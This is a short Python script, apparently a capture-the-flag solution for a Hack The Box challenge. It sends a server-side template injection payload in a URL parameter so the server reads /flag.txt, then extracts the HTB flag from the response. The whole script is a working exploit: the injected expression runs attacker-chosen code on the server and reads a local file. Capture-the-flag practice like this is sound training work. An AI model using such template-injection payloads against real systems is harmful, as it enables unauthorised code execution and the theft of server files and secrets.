import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="URL required for the exploit")
args = parser.parse_args()

url = args.url
payload = "${open('/flag.txt').read()}"
params = {"text": payload}

r = requests.get(url, params=params)  # ← Fixed this line
print("Status Code:", r.status_code)
print()
print("Flag: HTB{"+re.findall(r'HTB{(.*)}',r.text)[0]+"}")
